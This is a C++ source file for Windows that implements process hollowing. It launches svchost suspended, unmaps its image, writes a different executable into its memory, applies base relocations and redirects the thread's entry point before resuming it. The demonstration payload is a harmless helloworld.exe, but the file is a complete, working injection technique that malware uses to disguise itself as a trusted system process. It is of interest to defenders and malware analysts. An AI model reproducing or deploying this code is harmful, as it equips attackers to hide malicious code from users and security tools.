// ProcessHollowing.cpp : Defines the entry point for the console application.

#include "stdafx.h"
#include <windows.h>
#include "internals.h"
#include "pe.h"

void CreateHollowedProcess(char* pDestCmdLine, char* pSourceFile)
{

    printf("Creating process\r\n");

    LPSTARTUPINFOA pStartupInfo = new STARTUPINFOA();
    LPPROCESS_INFORMATION pProcessInfo = new PROCESS_INFORMATION();
    
    CreateProcessA
    (
        0,
        pDestCmdLine,        
        0, 
        0, 
        0, 
        CREATE_SUSPENDED, 
        0, 
        0, 
        pStartupInfo, 
        pProcessInfo
    );

    if (!pProcessInfo->hProcess)
    {
        printf("Error creating process\r\n");

        return;
    }

    PPEB pPEB = ReadRemotePEB(pProcessInfo->hProcess);

    PLOADED_IMAGE pImage = ReadRemoteImage(pProcessInfo->hProcess, pPEB->ImageBaseAddress);

    printf("Opening source image\r\n");

    HANDLE hFile = CreateFileA
    (
        pSourceFile,
        GENERIC_READ, 
        0, 
        0, 
        OPEN_ALWAYS, 
        0, 
        0
    );

    if (hFile == INVALID_HANDLE_VALUE)
    {
        printf("Error opening %s\r\n", pSourceFile);
        return;
    }

    DWORD dwSize = GetFileSize(hFile, 0);
    PBYTE pBuffer = new BYTE[dwSize];
    DWORD dwBytesRead = 0;
    ReadFile(hFile, pBuffer, dwSize, &dwBytesRead, 0);

    PLOADED_IMAGE pSourceImage = GetLoadedImage((DWORD)pBuffer);

    PIMAGE_NT_HEADERS32 pSourceHeaders = GetNTHeaders((DWORD)pBuffer);

    printf("Unmapping destination section\r\n");

    HMODULE hNTDLL = GetModuleHandleA("ntdll");

    FARPROC fpNtUnmapViewOfSection = GetProcAddress(hNTDLL, "NtUnmapViewOfSection");

    _NtUnmapViewOfSection NtUnmapViewOfSection =
        (_NtUnmapViewOfSection)fpNtUnmapViewOfSection;

    DWORD dwResult = NtUnmapViewOfSection
    (
        pProcessInfo->hProcess, 
        pPEB->ImageBaseAddress
    );

    if (dwResult)
    {
        printf("Error unmapping section\r\n");
        return;
    }

    printf("Allocating memory\r\n");

    PVOID pRemoteImage = VirtualAllocEx
    (
        pProcessInfo->hProcess,
        pPEB->ImageBaseAddress,
        pSourceHeaders->OptionalHeader.SizeOfImage,
        MEM_COMMIT | MEM_RESERVE,
        PAGE_EXECUTE_READWRITE
    );

    if (!pRemoteImage)
    {
        printf("VirtualAllocEx call failed\r\n");
        return;
    }

    DWORD dwDelta = (DWORD)pPEB->ImageBaseAddress -
        pSourceHeaders->OptionalHeader.ImageBase;

    printf
    (
        "Source image base: 0x%p\r\n"
        "Destination image base: 0x%p\r\n",
        pSourceHeaders->OptionalHeader.ImageBase,
        pPEB->ImageBaseAddress
    );

    printf("Relocation delta: 0x%p\r\n", dwDelta);

    pSourceHeaders->OptionalHeader.ImageBase = (DWORD)pPEB->ImageBaseAddress;

    printf("Writing headers\r\n");

    if (!WriteProcessMemory
    (
        pProcessInfo->hProcess,                 
        pPEB->ImageBaseAddress, 
        pBuffer, 
        pSourceHeaders->OptionalHeader.SizeOfHeaders, 
        0
    ))
    {
        printf("Error writing process memory\r\n");

        return;
    }

    for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
    {
        if (!pSourceImage->Sections[x].PointerToRawData)
            continue;

        PVOID pSectionDestination = 
            (PVOID)((DWORD)pPEB->ImageBaseAddress + pSourceImage->Sections[x].VirtualAddress);

        printf("Writing %s section to 0x%p\r\n", pSourceImage->Sections[x].Name, pSectionDestination);

        if (!WriteProcessMemory
        (
            pProcessInfo->hProcess,            
            pSectionDestination,            
            &pBuffer[pSourceImage->Sections[x].PointerToRawData],
            pSourceImage->Sections[x].SizeOfRawData,
            0
        ))
        {
            printf ("Error writing process memory\r\n");
            return;
        }
    }    

    if (dwDelta)
        for (DWORD x = 0; x < pSourceImage->NumberOfSections; x++)
        {
            char* pSectionName = ".reloc";        

            if (memcmp(pSourceImage->Sections[x].Name, pSectionName, strlen(pSectionName)))
                continue;

            printf("Rebasing image\r\n");

            DWORD dwRelocAddr = pSourceImage->Sections[x].PointerToRawData;
            DWORD dwOffset = 0;

            IMAGE_DATA_DIRECTORY relocData = 
                pSourceHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];

            while (dwOffset < relocData.Size)
            {
                PBASE_RELOCATION_BLOCK pBlockheader = 
                    (PBASE_RELOCATION_BLOCK)&pBuffer[dwRelocAddr + dwOffset];

                dwOffset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD dwEntryCount = CountRelocationEntries(pBlockheader->BlockSize);

                PBASE_RELOCATION_ENTRY pBlocks = 
                    (PBASE_RELOCATION_ENTRY)&pBuffer[dwRelocAddr + dwOffset];

                for (DWORD y = 0; y <  dwEntryCount; y++)
                {
                    dwOffset += sizeof(BASE_RELOCATION_ENTRY);

                    if (pBlocks[y].Type == 0)
                        continue;

                    DWORD dwFieldAddress = 
                        pBlockheader->PageAddress + pBlocks[y].Offset;

                    DWORD dwBuffer = 0;
                    ReadProcessMemory
                    (
                        pProcessInfo->hProcess, 
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );

                    //printf("Relocating 0x%p -> 0x%p\r\n", dwBuffer, dwBuffer - dwDelta);

                    dwBuffer += dwDelta;

                    BOOL bSuccess = WriteProcessMemory
                    (
                        pProcessInfo->hProcess,
                        (PVOID)((DWORD)pPEB->ImageBaseAddress + dwFieldAddress),
                        &dwBuffer,
                        sizeof(DWORD),
                        0
                    );

                    if (!bSuccess)
                    {
                        printf("Error writing memory\r\n");
                        continue;
                    }
                }
            }

            break;
        }


        DWORD dwBreakpoint = 0xCC;

        DWORD dwEntrypoint = (DWORD)pPEB->ImageBaseAddress +
            pSourceHeaders->OptionalHeader.AddressOfEntryPoint;

#ifdef WRITE_BP
        printf("Writing breakpoint\r\n");

        if (!WriteProcessMemory
            (
            pProcessInfo->hProcess, 
            (PVOID)dwEntrypoint, 
            &dwBreakpoint, 
            4, 
            0
            ))
        {
            printf("Error writing breakpoint\r\n");
            return;
        }
#endif

        LPCONTEXT pContext = new CONTEXT();
        pContext->ContextFlags = CONTEXT_INTEGER;

        printf("Getting thread context\r\n");

        if (!GetThreadContext(pProcessInfo->hThread, pContext))
        {
            printf("Error getting context\r\n");
            return;
        }

        pContext->Eax = dwEntrypoint;            

        printf("Setting thread context\r\n");

        if (!SetThreadContext(pProcessInfo->hThread, pContext))
        {
            printf("Error setting context\r\n");
            return;
        }

        printf("Resuming thread\r\n");

        if (!ResumeThread(pProcessInfo->hThread))
        {
            printf("Error resuming thread\r\n");
            return;
        }

        printf("Process hollowing complete\r\n");
}

int _tmain(int argc, _TCHAR* argv[])
{
    char* pPath = new char[MAX_PATH];
    GetModuleFileNameA(0, pPath, MAX_PATH);
    pPath[strrchr(pPath, '\\') - pPath + 1] = 0;
    strcat(pPath, "helloworld.exe");
    
    CreateHollowedProcess
    (
        "svchost", 
        pPath
    );

    system("pause");

    return 0;
}